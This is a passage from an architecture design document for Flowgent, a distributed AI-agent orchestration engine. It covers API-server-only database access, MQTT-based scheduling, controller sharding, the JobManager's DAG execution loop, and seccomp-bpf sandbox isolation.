# Flowgent Distributed Orchestration Engine Architecture

**Date:** 2026-06-08
**Status:** Implemented — 12 Go modules, apiserver-only DB access (all non-apiserver components use FlowgentClient REST + MQTT), seccomp-bpf sandbox isolation + K8s pod-level isolation, three-phase architecture (Design→Schedule→Execute), sandbox as independent pods managed by JM via K8sRM, E2E verified on k3s

---

## 1. Architecture Overview

Flowgent is a distributed multi-namespace AI agent orchestration engine. **Only the API Server
connects to the database** — all other components communicate exclusively via MQTT (real-time
scheduling bus) or call the API Server REST endpoints for state updates. Internal
inter-component communication never uses SSE/WebSocket; WS is reserved for notifier→UI only.
This aligns with Kubernetes' single-etcd-access pattern and Flink's Akka-based TM coordination.

```
═══════════════════════════════════════════════════════════════════════════════════
PHASE 1 — Flow Design & Trigger (Sync)
═══════════════════════════════════════════════════════════════════════════════════

  UI / REST / A2A / Webhook          Notifier (WS push to UI only)
       │                                      ▲
       ▼                                      │
  ┌──────────────────────────────────────────┼──────────────────────────┐
  │                           API Server                               │
  │                                                                    │
  │  • Flow/Agent CRUD → PG (sole DB client)           port 9999       │
  │  • Trigger → CREATE PENDING run                    port 9992 (A2A) │
  │  • Flow lifecycle → MQTT events (create/update/delete)             │
  │  • Flow cache + hot-reload (static YAML dir)                       │
  │  • State reads/writes via REST handlers                            │
  └──────────┬─────────────────────────────────┬───────────────────────┘
             │                                 │
             ▼                                 ▼
  ┌────────────────────┐            ┌──────────────────────────────────┐
  │   PG / SQLite      │            │         MQTT (EMQX)             │
  │   (apiserver-only) │            │    real-time scheduling bus     │
  └────────────────────┘            └──────────────┬───────────────────┘
                                                   │
═══════════════════════════════════════════════════╪═══════════════════════
PHASE 2 — Scheduling (Async)                      │
═══════════════════════════════════════════════════╪═══════════════════════
                                                   │
  Controller                                       │
  • FlowgentClient.ListFlows (apiserver REST)      │
  • MQTT: subscribe lifecycle events               │
  • hash(flow_id) % N → N-way sharded              │
  • MQTT: ctrl.jm.create/{namespace}/{flow} ──────────┤  → dedicated JM
                                                   │
═══════════════════════════════════════════════════╪═══════════════════════
PHASE 3 — Execution (Async)                       │
═══════════════════════════════════════════════════╪═══════════════════════
                                                   │
  JobManager                                       │
  • FlowgentClient.ListRuns (apiserver REST)       │
  • Build DAG → ExecutionPlans                     │
  • MQTT: .../exec/plans ──────────────────────────┤  → dispatch to TM
  • MQTT: .../exec/results ← consume ──────────────┤  ← TM results
  • State: UpdateRun/SaveTask via apiserver REST   │
       │                                           │
       ▼                                           │
  TaskManager (N pods × M slots)                   │
  • $share/tm-pool: consume ExecutionPlans         │
  • ExecutorRouter: 12 node types                  │
  • Skill/sandbox nodes → dispatch via MQTT to SB  │
  • MQTT: .../exec/results ────────────────────────┤  → status to JM
  • State: SaveTask via apiserver REST (TaskStateStore) │
       │                                           │
       ▼                                           │
  Sandbox (N pods, independent Deployment)         │
  • $share/sandbox-pool: consume triggers from TM  │
  • Separate K8s pods — pod-level + seccomp-bpf    │
  • Shares workspace PVC with TM pods              │
  • MQTT: .../sandbox/result → TM                  │
                                                   │
  Notifier                                         │
  • $share/notify-pool: consume events             │
  • → Slack / Telegram / DingTalk / Email / Webhook│
  • MQTT: notify.result.{namespace}.{flow} ───────────┤  → confirmation
  • WS → UI clients only (human approval push)     │
                                                   │
  All state writes: → FlowgentClient REST → apiserver → PG/DB
═══════════════════════════════════════════════════════════════════════════
```

**Architecture constraints (aligned with K8s + Flink):**

| Constraint | Detail |
|------------|--------|
| **Only apiserver connects to DB** | Single PG/SQLite client with flow cache |
| **All other components: MQTT or apiserver REST** | controller, JM, TM, sandbox, notifier — no direct DB |
| **Management chain** | controller → JM → TM + Sandbox (JM manages both via K8sRM) |
| **State writes via apiserver** | POST/PUT REST API for run/task status updates |
| **Real-time dispatch via MQTT** | ExecutionPlan distribution, sandbox triggers, notifier events |
| **Internal communication: MQTT only** | No SSE/WS between components; WS is notifier→UI only |

### 1.1 Session vs Application — Helm Deployment Matrix

> **⚠️ Current implementation status**: Session mode is **temporarily disabled**
> to simplify troubleshooting. The Helm chart no longer deploys a shared
> jobmanager/taskmanager pool, the Controller no longer creates `namespace=""`
> runs, and `entities.Priority` only accepts `"high"` (see its doc comment in
> `pkg/model/pkg/entities/scheduling.go`) — every agentflow currently runs in
> **Application mode** (a dedicated per-flow JM Deployment). The `Priority`
> field and the Session-mode design below are intentionally kept/documented
> as **reserved** for a future reintroduction, but do not reflect the current
> runtime behavior; treat every "Session" row/branch in this section (and in
> §4.2/§4.3, §9.2, §10.2) as historical/future-facing, not active.

Both modes use the **same binary, same poller, same DAG execution logic**.
The difference is **which components Helm pre-deploys** vs. **which are created dynamically at runtime**.

**Deployment mode** is configured via `deployment.mode` in `flowgent.yaml` (or Helm `mode` value),
and can be overridden at runtime via `FLOWGENT_DEPLOYMENT_MODE` env var:

```yaml
# flowgent.yaml
deployment:
  mode: session       # "session" or "application"
```

```yaml
# Helm values.yaml
mode: session         # "session" or "application"
```

**Component deployment by mode:**

| Component | Session | Application | Notes |
|-----------|---------|-------------|-------|
| apiserver | Helm | Helm | Always pre-deployed — REST API + triggers |
| controller | — | **Helm** | Only in application mode — polls apiserver REST API, creates dynamic JMs |
| jobmanager | **Helm** | **Controller (dynamic)** | Session: shared pool. App: `buildJMDeployment()` per-flow |
| taskmanager | **Helm** | **JM auto-scale** | Session: admin-managed replicas. App: JM's K8s RM scales |
| sandbox | **Separate pods** | **Separate pods** | Independent K8s Deployment managed by JM's K8sRM alongside TM Deployment. Pod-level seccomp profile (RuntimeDefault) + per-execution seccomp-bpf filtering = defense-in-depth. JM's scaling goroutine manages both TM and sandbox replicas. Shares workspace PVC with TM. |
| notifier | Helm | Helm | Both modes. Session: shared workspace vol. App: dedicated vol. |
| a2a | optional | optional | `--set a2a.enabled=true` |
| wallet | optional | optional | `--set wallet.enabled=true` |

**Session mode — Helm pre-deploys 4 components:**

```graph
apiserver + jobmanager + taskmanager + notifier
```
Note: sandbox runs as independent pods managed by JM's K8sRM, sharing workspace PVC with TM.

API Server handles triggers directly → creates PENDING runs → JM poller executes.

**Application mode — Helm pre-deploys 3 components:**

```graph
apiserver + controller + notifier
```

Controller watches apiserver → creates dedicated jobmanager for grade-priority flows. JM's K8sRM auto-scales both TM and sandbox pods.

| | Session | Application |
|---|---|---|
| **JM started by** | Helm / Admin (platform init) | Controller (on flow discovery) |
| **JM naming** | `flowgent-jobmanager-{namespaceId}-{hash}` | `flowgent-jobmanager-{namespaceId}-{flowId}-{runId}-{hash}` |
| **JM lifecycle** | Persistent, shared across namespaces | Per-flow, destroyed on completion |
| **TM scale** | **Manual** (admin-managed replicas) | **Auto** (JM's K8s RM scales TMs) |
| **Slot exhaustion** | Run stays PENDING, admin adds TMs | JM auto-scales TM replicas |
| **Workspace** | Shared PVC (ReadWriteMany) | Per-flow subdirectory (same PVC) |
| **Resource isolation** | Logical (namespace_id + rate limit) | Physical (dedicated K8s namespace) |
| **Flink analogy** | Session Cluster | Application Cluster |

**How mode is resolved at runtime:**

1. `config.Load()` reads `deployment.mode` from YAML (viper auto-binds `FLOWGENT_DEPLOYMENT_MODE` env var)
2. Session JM (Helm-deployed): config file has `mode: session` → shared pool, `AutoScale=false`
3. Application JM (Controller-created): Controller sets `FLOWGENT_DEPLOYMENT_MODE=application` on the pod, overriding the config file → `AutoScale=true`
4. `FLOWGENT_NAMESPACE` is a namespace filter for the runPoller, NOT a mode flag

**JM polling scope — namespace-wide scan vs zero-scan:**

| | Session JM | Application JM |
|---|---|---|
| **Startup** | `jobmanager start` | `jobmanager start --flow-id <id>` |
| **Flow spec** | Load ALL flows from config + DB | Load single flow from DB by ID |
| **Run poller** | `ListAgentFlowRuns("", 50)` — full table scan | `ListAgentFlowRuns("<id>", 50)` — targeted index query |
| **Polling needed** | Yes — must discover PENDING runs | Yes — but only for its one flow |

**Key design**: Application JM receives the flow ID at startup (Controller passes
`--flow-id` in `buildJMDeployment` args). It does NOT scan config files or load
unrelated flows. Session JM alone performs namespace-wide discovery.

**TM scaling design decision**: Session mode TMs are admin-managed (Helm `replicas`).
If slots are exhausted, JM returns `INSUFFICIENT_RESOURCES` — the run stays PENDING
until admin scales capacity. This creates a clear economic boundary: shared = economy
class (fixed capacity), application = first class (elastic, isolated).

### 1.2 Controller ≈ Flink Operator (Key Differences)

The Controller is Flowgent's equivalent of Flink's Operator/Dispatcher, with two
fundamental differences:

| Flink Operator | Flowgent Controller |
|---|---|
| Watches K8s CRDs (FlinkDeployment) | **Polls apiserver REST API** (FlowgentClient.ListFlows) |
| Single active (leader-elected) | **N-way sharded** (hash-mod across pods) |
| CRD-driven reconciliation | **API-scan reconciliation** (Apache ShardingSphere style) |

The API polling approach avoids CRD complexity and keeps the flow catalog
behind the apiserver as the single DB gateway.

### 1.3 Deployment Namespaces and Pod Naming

Namespace isolation uses two K8s layers:

- **System namespace**: `flowgen-system` by default, configurable via
  `runtime.system_namespace` or `FLOWGENT__RUNTIME__SYSTEM_NAMESPACE`.
  Long-running platform services live here: apiserver, controller, notifier,
  a2a, wallet, and middleware deployed by Helm.
- **Application namespace**: `{runtime.namespace.namespace_prefix}{namespaceId}`
  (default `flowgent-{namespaceId}`). Runtime workers live here:
  jobmanager, taskmanager, and sandbox. A namespace's flows share the same
  application namespace; per-flow ownership is expressed by deployment name and
  labels.

Pod names and labels carry `namespace_id` + `flow_id` for observability:

**Components** (distributed mode):

| Component | Required | K8s namespace | Role |
|-----------|----------|---------------|------|
| apiserver | yes | System namespace | REST API gateway, auth, triggers |
| controller | yes | System namespace | Flow discovery, run dispatch, hash-mod sharding |
| jobmanager | yes | Application namespace | DAG orchestration, task scheduling |
| taskmanager | yes | Application namespace | Task execution via router (12 node types) |
| sandbox | yes | Application namespace | Isolated script execution worker; JM/RM-managed like TM |
| notifier | yes | System namespace | Multi-channel push + WebSocket SSE |
| a2a | **optional** | System namespace | Google Agent-to-Agent protocol endpoint |
| wallet | **optional** | System namespace | x402 Ed25519 payment signing |

> **Note**: `a2a` and `wallet` are optional in distributed mode and default to `enabled: false`
> in the Helm chart. Use `--set a2a.enabled=true` or `--set wallet.enabled=true` to enable.
> In all-in-one mode, all components run in a single process regardless.

```
System services (Helm release in flowgen-system, {hash}=K8s suffix):
  flowgent-{component}-{hash}

Application runtime (JM-owned, {hash}=K8s suffix):
  flowgent-{component}-{namespaceId}-{flowId}-{hash}
```

**Examples — Session mode (required components):**
```
flowgent-apiserver-abc123
flowgent-controller-ghi789
flowgent-notifier-stu901
```

**Examples — Application mode:**
```
flowgent-jobmanager-default-security-autonomy-fixer-xyz001
flowgent-taskmanager-default-security-autonomy-fixer-xyz002
flowgent-sandbox-default-security-autonomy-fixer-xyz003
```

Labels on all pods:
```yaml
flowgent.io/namespace:       "default"
flowgent.io/flow:            "security-autonomy-fixer"
flowgent.io/mode:            "application"
flowgent.io/managed-by:      "jobmanager"    # TM/Sandbox only
flowgent.io/parent-jobmanager: "flowgent-jobmanager-default-security-autonomy-fixer"
```

---

### 1.4 Key Design Decisions (KDD)

| Decision | Rationale |
|----------|-----------|
| **Only apiserver connects to DB (K8s-aligned)** | Single PG/SQLite client with caching — all other components (controller, JM, TM, sandbox, notifier) use MQTT or call apiserver REST. Aligns with Kubernetes' single-etcd-access pattern. Eliminates N×M connection pool complexity. |
| **Controller gets flows via apiserver REST API, not PG scan** | `FlowgentClient.ListFlows()` and subscribes to MQTT lifecycle events for real-time changes. apiserver publishes flow lifecycle events on create/update/delete. Hash-mod sharding still applies. |
| **Session = K8sRM (AutoScale=false), Application = K8sRM (AutoScale=true), All-in-one = StandaloneRM** | Flink-aligned naming. Session: pre-deployed fixed TM replicas, JM dispatches via MQTT. Application: per-flow K8s namespace, JM auto-scales TMs by queue depth. |
| **JM → TM/Sandbox management chain with Controller orphan GC** | Controller owns per-flow JM Deployments only while a real run is active (`PENDING`/`RUNNING`/`PAUSED`); importing a flow definition or skill is metadata registration and does not allocate runtime pods. Each active JM owns labeled TM and Sandbox Deployments. Controller garbage-collects JM-owned runtime resources when no active run remains or the flow is deleted. Unexpected parent-JM disappearance while a run is still active is observed for `runtime.tm_orphan_timeout` (default `3m`) before runtime cleanup. State flows back via MQTT → apiserver → PG. |
| **Runtime credentials enter pods through K8s Secret envFrom** | Host shell env is only a deployer/console-import input. Kubernetes runtime credentials for external MCPs, GitHub, SonarQube, and LLM calls are provided by the Secret named in `runtime.credential_env_secret`. Controller mounts it into per-flow JM pods, and JM's K8sRM mounts it into TM/Sandbox pods via optional `envFrom.secretRef`. |
| **Agent memory scoped by (flow_id, node_id), not run_id** | Persists across restarts; no cross-flow knowledge sharing (KISS); content accumulates monotonically for RAG-style recall |
| **JM unification: same binary, same DAG engine for both modes** | Session: `jobmanager start` → apiserver GET runs. Application: `jobmanager start --flow-id <id>` → apiserver GET runs for that flow. |
| **A2A uses `a2aproject/a2a-go` types directly, not ADK's `adka2a` wrapper** | ADK's A2A server binds to `session.Session`, `genai.Content`, and ADK internal types — all incompatible with Flowgent's DAG orchestration model. The official `a2aproject/a2a-go` SDK provides clean protocol types (`AgentCard`, `Task`, `Message`) without opinionated framework coupling |
| **Sandbox as independent pods managed by JM (defense-in-depth)** | Sandbox runs as separate K8s pods managed by JM's K8sRM (same goroutine pattern as TM scaling). The JM — as the job/flow-level orchestrator — is the natural owner for both TM and sandbox lifecycle. Two-layer isolation: pod-level (K8s NetworkPolicy + seccomp RuntimeDefault profile) blocks broad egress at the CNI/container runtime layer; process-level (seccomp-bpf + userspace notifier) enforces per-flow per-node dynamic allowlists. Independent CPU/mem/volume limits prevent noisy-neighbor resource contention between TM and sandbox. TM and sandbox share a ReadWriteMany PVC organized by flowId directory — TM writes scripts, sandbox executes them, TM reads results from the same volume. |
| **Sandbox network isolation via seccomp-bpf + userspace notifier, not iptables** | Per-flow per-node dynamic allowlists require per-execution granularity. iptables is pod-level static (iptables rules apply to all processes in a netns). Istio/envoy is also pod-level via sidecar injection. seccomp-bpf with `SECCOMP_RET_USER_NOTIF` gives **per-thread, per-execution** filtering at the syscall level — the filter is installed dynamically before each script runs and dies with the child process. A userspace notifier goroutine (in the sandbox runner) resolves hosts → IPs and checks each `connect()`/`sendto()`/`sendmsg()` target address against the resolved allowlist by reading `/proc/<pid>/mem`. DNS (port 53) is unconditionally allowed at the BPF level so hostnames can be resolved before connect. SOCK_RAW is unconditionally blocked. See §15 for full design. |
| **MCP transport is HTTP-only (Streamable HTTP), not stdio subprocess** | TM pods are backend K8s agents without human interaction or a desktop environment. Spawning MCP server binaries as stdio subprocesses (`NewStdioMCPClient`) is a desktop/IDE pattern (Claude Code, Cursor) — it requires the MCP binary to be in the container image, adds subprocess lifecycle management overhead, and couples the TM to specific binary versions. HTTP mode (`NewStreamableHttpClient`) treats MCP servers as independent services — they can be deployed, scaled, and updated separately (e.g. sonarqube-mcp as a Docker container or Helm release). The `McpInfo` entity stores a URL + headers, not a command vector. See §6.2. |

---

## 2. API Server — Sole DB Client + Multi-Namespace Gateway

**The only component with database access.** All other components read/write state
through the API Server's REST endpoints or via MQTT (real-time scheduling). This
aligns with Kubernetes' apiserver→etcd pattern.

1. **Sole DB connection** — PG/SQLite via a single connection pool (20 max)
2. **Flow definition cache** — in-memory map, invalidated on CRUD, pushed to Controller via watch
3. **MQTT lifecycle events** — publishes flow/run lifecycle events for real-time consumption by Controller, JM, and other components
4. **State write endpoint** — JM/TM/sandbox update run/task status via REST (FlowgentClient), notifier reads channels via API
5. **Multi-tenancy** — Auth (JWT/OIDC/GitHub OAuth) + rate limiting + namespace routing
6. **Scale independence** — stateless, 2+ replicas (JM is stateful, leader-elected)

### 2.1 REST API (Port 9999)

| Route | Method | Description |
|-------|--------|-------------|
| `/_/healthz` | GET | Health check |
| `/api/v1/webhook/{provider}` | POST | SCM webhook trigger (GitHub/GitLab/Gitea) — per-provider body adapter |
| `/api/v1/{namespace}/agents` | GET/POST | List / Create agent definitions |
| `/api/v1/{namespace}/flows` | GET/POST | List / Create flows |
| `/api/v1/{namespace}/flows/{id}` | GET/PUT/DELETE | Flow CRUD |
| `/api/v1/{namespace}/flows/trigger` | POST | Create PENDING run |
| `/api/v1/{namespace}/runs` | GET/POST | List runs (JM polls this) / Create run |
| `/api/v1/{namespace}/runs/{id}` | GET/PUT | Run status + update |
| `/api/v1/{namespace}/runs/{id}/tasks` | GET/POST | Task list + create (JM/TM write) |
| `/api/v1/{namespace}/runs/{id}/tasks/{tid}` | PUT | Update task status (TM writes) |
| `/api/v1/{namespace}/runs/{id}/cancel` | POST | Cancel a running flow |
| `/api/v1/{namespace}/notifications/channels` | GET | Notifier channel list |
| `/api/v1/{namespace}/llm/providers` | GET | LLM provider definitions |
| `/api/v1/human/approvals` | GET/POST | List pending / Create human approval |
| `/api/v1/human/{token}/approve` | POST | Human approval |
| `/api/v1/human/{token}/reject` | POST | Human rejection |

### 2.2 A2A Protocol (Port 9992)

Google Agent-to-Agent protocol for inter-agent interoperability:

| Route | Method | Description |
|-------|--------|-------------|
| `/.well-known/agent.json` | GET | Agent card (skills, schemas, capabilities) |
| `/a2a/tasks` | POST | Submit agentflow for execution |
| `/a2a/tasks/{id}` | GET | Query task result |

### 2.3 Auth & Multi-Tenancy

JWT-based auth (ES256/RS256/EdDSA). Configurable anonymous paths:
`/public/**`, `/static/**`, `/_/healthz/**`, `/a2a/**`. OIDC and GitHub OAuth
supported for user-facing endpoints.

### 2.4 Submit Path (API → Store → JM)

The API Server is purely a persistence layer — it never calls the JM directly.
There are two ways runs enter the system:

**Path A: API Trigger (sync write, async execution)**

```
POST /api/v1/{namespace}/flows/trigger
  → agentFlowHandler validates spec exists
  → run := { AgentFlowID, Vars, Status:PENDING, Namespace, Namespace:"" }
  → persist via apiserver store       // ← sync ends here
  → returns run_id to caller
  ... (later, asynchronously) ...
  → JM's runPoller (2s tick) finds PENDING run via FlowgentClient.ListRuns
  → jm.Submit(run, spec) → JobMaster.Execute()
```

**Path B: Controller Dispatch (fully async)**

```
Controller polls apiserver ListFlows every 10s:
  → Hash-mod shard: only processes owned flows
  → Session mode: FlowgentClient.CreateRun (PENDING, namespace="")
  → Application mode: create K8s JM Deployment
                      + FlowgentClient.CreateRun (PENDING, namespace={ns})
  ... (later, asynchronously) ...
  → Shared JM picks up namespace="" runs
  → Dedicated JM picks up its namespace runs
  → jm.Submit(run, spec) → JobMaster.Execute()
```

---

## 3. JobManager — DAG Orchestrator (apiserver REST + MQTT, NO DB)

The JM is the singleton control plane (per session or per application). It polls
the apiserver REST API (`FlowgentClient.ListRuns`) for PENDING runs (with namespace
filtering), parses the `AgentFlowSpec` JSON, and spawns a **JobMaster** per run.
Each JobMaster builds a DAG from `AgentFlowSpec.Nodes` + `Edges`, persists execution
state via the apiserver REST API, and executes nodes in topological order via the
ResourceManager.

### 3.1 JobMaster — Per-Run DAG Orchestrator

JobMaster holds per-run DAG state: nodes, edges, dependencies, completion/failure/
skip flags, node outputs, and conditions. Created per `Submit()` call. No shared
state between runs.

```
Execute(run, spec):
  // Step 1: Build DAG from AgentFlowSpec JSON
  buildExecutionGraph(spec, runID)
    → For each node: create ExecutionPlan in memory (planMap)
    → One ExecutionPlan per DAG node

  // Step 2: Topological loop — process each ready node
  for each ready node (all dependencies satisfied):
    plan := resolveInputs(node, previousOutputs)
    state.SaveTask(ctx, task)             // persist task run via apiserver REST
    result := rm.Schedule(ctx, plan)      // dispatch to TM (MQTT or standalone)
    state.UpdateRun(ctx, run)             // update run status via apiserver REST
    Done(nodeID)
    if condition → SetConditionResult → Skip(false-branch)
    if supervisor → validate action → Inject/Retry/Abort

  // Step 3: Finalize
  → run.Status = COMPLETED | FAILED
  → Persist final state via apiserver REST
```

### 3.2 DAG State Methods

| Method | Purpose |
|--------|---------|
| `BuildGraphNodes(nodes, edges)` | Initialize DAG from spec |
| `Ready()` | Return nodes with all deps satisfied |
| `Done(id)` | Mark node complete |
| `Skip(id)` | Skip node (condition false path) |
| `Fail(id)` | Mark node failed |
| `Inject(id, deps)` | Supervisor-injected node |
| `IsComplete()` | All nodes done or skipped |
| `HasFailed()` | Any node failed |
| `SetConditionResult(id, bool)` | Store condition branch result |

### 3.3 JM Unification

Both session and application JMs use the **same binary + same code path**. The
only difference is `FLOWGENT_NAMESPACE`:
- Session: empty → runPoller picks runs with `namespace=""`
- Application: `flowgent-{namespace}-{flow}` → runPoller picks runs in that namespace

### 3.4 DAG Dependency Coordination — Iteration Loop + Blocking Schedule

The JM is the **sole dependency controller** for a flow run. It does not just
fire off ExecutionPlans and hope they execute in order — it actively enforces
the DAG's topological constraints through a **two-level loop pattern**: an outer
iteration loop that repeatedly discovers newly-ready nodes, and an inner per-node
blocking `Schedule()` that waits for the TM to complete each node before
dispatching the next.

#### 3.4.1 Execution Loop (Pseudocode)

```
Execute(run, spec):
  buildExecutionGraph(spec, runID)   // initialize DAG state

  for iteration := 1; ; iteration++:
    if HasFailed()  → run.Status = FAILED, persist, return
    if IsComplete() → run.Status = COMPLETED, persist, return

    ready := Ready()                 // nodes with all deps satisfied
    if len(ready) == 0:
      break                          // deadlock: some nodes have unsatisfied deps

    for each nodeID in ready:
      plan := buildPlan(nodeID, resolvedInputs)
      state.SaveTask(plan)           // persist task run via REST

      result := rm.Schedule(plan)    // ← BLOCKING: waits for TM result
      if result.Error != "":
        Fail(nodeID)                 // child nodes stay blocked → flow fails
        continue

      nodeOutputs[nodeID] = result.Output
      Done(nodeID)                   // unblocks children for next iteration

      if node is condition:
        SetConditionResult(nodeID, bool)
        for each child with false-match edge:
          Skip(child)                // false-branch skipped
```

**Key insight**: `rm.Schedule()` is a **synchronous blocking call** — the JM
waits for the TM to execute the plan and report the result before continuing.
This means sibling nodes (e.g. B1, B2, B3 all depending on A) are dispatched
**sequentially** within one iteration, not concurrently. Each node's result
arrives before the next node is dispatched. True concurrent dispatch of
sibling nodes is a potential future optimization (dispatch all siblings,
collect results via a `sync.WaitGroup`), but the current sequential approach
is simpler and avoids partial-failure rollback complexity.

#### 3.4.2 Dependency Resolution — `depsDone()` Algorithm

```
depsDone(node):
  if node has zero dependencies → true (root node)

  for each dependency d:
    if d is completed or skipped → this dep is satisfied, continue
    if edge(d→node) has a condition value AND d is not yet evaluated:
      → dormant conditional edge, skip (don't block)
    otherwise → this dep is unsatisfied, return false

  return true  // all deps satisfied or dormant
```

**Conditional edge handling**: When an edge carries a `condition` (true/false),
it is treated as **dormant** until the source node executes. A dormant
conditional edge does NOT block the target node — the `depsDone` check skips
it. After the condition node executes, `SetConditionResult()` is called, and
all children on the false-branch are explicitly `Skip()`ped. This means
condition nodes gate their children through the Done→Skip mechanism, not
through blocking in `depsDone`.

#### 3.4.3 K8s Mode: Subscribe-Before-Publish + Per-Node Channel Routing

In K8s (MQTT) mode, `K8sRM.Schedule()` implements a **subscribe-before-publish**
pattern to avoid missing the TM's response:

```
K8sRM.Schedule(plan):
  1. Create resultCh := make(chan execResult, 1)

  2. SUBSCRIBE to exec/results (once per run):
     if s.runResults[runID] == nil:
       q.Subscribe("exec/results/{namespace}/{flow}/{run}", callback)
     s.runResults[runID][plan.NodeID] = resultCh
     // ^^ channel registered BEFORE publish — no race

  3. PUBLISH plan to exec/plans/{namespace}/{flow}/{run}
     → TM pods consume via $share/tm-pool

  4. BLOCK on resultCh (with planTimeout):
     select {
       case <-ctx.Done():  → timeout, return error
       case er := <-resultCh:
         if er.State == "FAILED" → return error
         return TaskResult{Output: {plan_id, node_id, state}}
     }
```

The callback routes incoming `exec/results` messages to the correct node's
channel by matching `er.NodeID` against registered channels, then deletes
the channel entry (cleanup). The `runResults` map is keyed by `(runID,
nodeID)` — each node gets its own dedicated channel. This means even though
nodes are dispatched sequentially, the routing infrastructure supports
concurrent dispatch if the JM loop were changed to fire-and-collect.

#### 3.4.4 Round-Trip Timing Diagram (Single Node)

```
JM.Execute()          K8sRM.Schedule()         MQTT                TM.SlotWorker
──────────            ────────────────          ────                ─────────────
Ready() → [A]
  │                     
  ├─Schedule(A) ──►   Subscribe exec/results
  │                   Register chan[A]
  │                   Publish exec/plans ────►  ──────────────►  Dequeue ($share)
  │                                                                Execute via Router
  │                   ◄── Publish exec/results ──  ◄────────────  Save task via REST
  │                   Route er.NodeID → chan[A]                    Report state back
  │                   delete chan[A]
  ◄── result ────────
  Done(A)

Ready() → [B]          // B was blocked on A, now ready
  ...
```

#### 3.4.5 Edge Cases

| Scenario | Behavior |
|----------|----------|
| **Root nodes (no deps)** | `Ready()` returns them immediately — first iteration |
| **Parallel siblings** | All siblings become `Ready()` in the same iteration after their shared parent is `Done()`. Dispatched sequentially but each blocks independently. |
| **Condition node → false branch** | False-branch children are `Skip()`ped immediately after condition executes. They never appear in `Ready()`. |
| **Node fails** | `Fail(node)` — children stay blocked (never become ready). `HasFailed()` → flow terminates. |
| **Deadlock** (Ready=∅, !IsComplete, !HasFailed) | Some nodes have permanently unsatisfied deps (e.g. a dependency was never created). Loop breaks, returns nil — nodes left in PENDING. |
| **TM timeout** | `planTimeout` (default 5 min) — `Schedule()` returns error, node is marked failed, flow terminates. |
| **TM crash mid-execution** | JM heartbeat monitor detects dead TM after 30s. Orphaned plans are re-dispatched (failover). |

---

## 4. Controller — Distributed Flow Driver (apiserver REST + MQTT, NO DB)

Polls the apiserver REST API (`FlowgentClient.ListFlows`) for agentflow definitions,
shards across pods via hash-mod. For each owned flow, it either creates a PENDING run
via the apiserver REST API (session mode, picked up by the shared JM) or creates a
dedicated K8s JM Deployment + creates a PENDING run (application mode, picked up by the
dedicated JM). The Controller also subscribes to MQTT lifecycle events for real-time
flow updates. The Controller never calls JM directly — communication is through the
apiserver REST API and MQTT.

### 4.1 Hash-Mod Sharding

```
shard(flow_id) = fnv64a(flow_id) % total_controller_pods
```

Each pod discovers total count via `IDiscoveryClient` (K8s label selector or env
vars). Only processes flows where `shard == pod_index`.

### 4.2 Reconciliation Loop

> ⚠️ Session mode currently disabled (see §1.1) — step 3 always takes the
> Application branch (3a) regardless of priority; the peer snapshot from
> step 1 is fetched once per tick and reused for every flow's shard check
> and for JM Deployment GC (`pkg/controller/pkg/controller.go` `reconcile`).

```
Every 10s:
  1. IDiscoveryClient.DiscoverPeers(labelSelector)
  2. apiClient.ListFlows(namespace) → latest version per flow_id
  3. For each flow where shard(flow_id) == my_index:
     a. Application: create/ensure K8s JM Deployment + create PENDING run via API
     b. (reserved) Session: create PENDING run via apiClient.CreateRun (namespace="")
  4. Poll runs for completion via API, clean up
```

### 4.3 Dispatch Detail

> ⚠️ Session mode currently disabled (see §1.1) — the `low/medium/high` row
> below is not reachable; `entities.Priority` only accepts `"high"`, which
> takes the Application row.

| Priority | Mode | Controller Action | Who Executes |
|----------|------|-------------------|--------------|
| low/medium (reserved, not accepted) | Session | Create PENDING run via `apiClient.CreateRun` (namespace="") → shared JM picks up | Admin-managed TM pool |
| high | Application | Create K8s JM Deployment + create PENDING run via API (namespace={namespace}) → dedicated JM picks up | JM auto-scales TMs via K8sRM |

### 4.4 Dual Format: Static YAML vs DB JSON

Both modes use `model.AgentFlowSpec` (dual-tagged `json:` + `yaml:`). Static YAML
loaded at startup + hot-reload. DB JSON saved by UI via API, polled by Controller.

---

## 5. ResourceManager / Scheduler — Pluggable Dispatch

JM calls `Schedule(ctx, plan)` once per ready node. The RM evaluates pending plans
against free slots to decide where and how to execute. In production (K8s) mode, it
also manages TM pod lifecycle — creating the TM Deployment if it doesn't exist and
auto-scaling replicas to meet demand.

```go
type ResourceManager interface {
    Provider() engine.Provider
    Validate(ctx) error
    Schedule(ctx, plan) (*TaskResult, error)
    Shutdown(ctx) error
}
```

### 5.1 StandaloneResourceManager (all-in-one mode)

Bounded in-process goroutine pool using a channel semaphore (`make(chan struct{},
poolSize)`). `Schedule()` acquires a slot via non-blocking select — if all slots are
busy, returns `INSUFFICIENT_RESOURCES` immediately. When a slot is acquired, calls
`tm.ExecutePlan()` synchronously in the same goroutine.

### 5.2 KubernetesResourceManager (production mode)

Three responsibilities: **task dispatch**, **TM pod management**, and
**Sandbox pod management**.

**Dispatch**: `Schedule()` is a **blocking** call — it does NOT fire-and-forget.
It subscribes to `exec/results` for the run (once), registers a per-node Go channel
(keyed by `nodeID`), publishes the plan to `exec/plans`, then **blocks on the channel**
waiting for the TM to execute and report the result. This subscribe-before-publish
ordering avoids the race where the TM responds before the JM is listening.

The per-run result routing map (`runResults map[string]map[string]chan execResult`)
routes incoming `exec/results` messages to the correct node's channel by matching
`er.NodeID`. When a result arrives, the channel entry is deleted (cleanup). Each
`Schedule()` call creates its own channel and waits on it independently — this
means the JM dispatches sibling nodes **sequentially** (one completes before the
next is dispatched), not concurrently. See §3.4 for the full DAG coordination
design.

**TM pod management**: Manages a per-flow K8s Deployment
(`flowgent-taskmanager-{namespaceId}-{flowId}` in application mode). A JM does
not create idle TM pods on startup. When `Schedule()` sees pending tasks, it
creates the Deployment if needed, labels it with its parent JM Deployment
(`flowgent.io/parent-jobmanager`, `flowgent.io/parent-jobmanager-namespace`),
scales to `ceil(pendingTasks / slotsPerTM)`, waits for the required replicas to
be available, then publishes `exec/plans` so MQTT work is not lost before TM
subscribers exist.

**Sandbox pod management**: Sandbox is not a system daemon. The same JM-owned
K8sRM manages a per-flow Sandbox Deployment
(`flowgent-sandbox-{namespaceId}-{flowId}`) and scales it from zero only when
scheduled tasks of type `sandbox` are active. Desired replicas are calculated as
`ceil(pendingSandboxTasks / sandboxSlotsPerPod)`, bounded by
`sandbox.deployment.min_replicas` and `max_replicas`. Each Sandbox pod runs
`SandboxSlotWorker` goroutines (`slots_per_pod`) behind a single MQTT shared
subscription scoped to that namespace/flow.

A `scalingLoop` goroutine runs every 15-60s. In **application mode only**, it reads
pending task counters and current replicas, calculates needed replicas, and
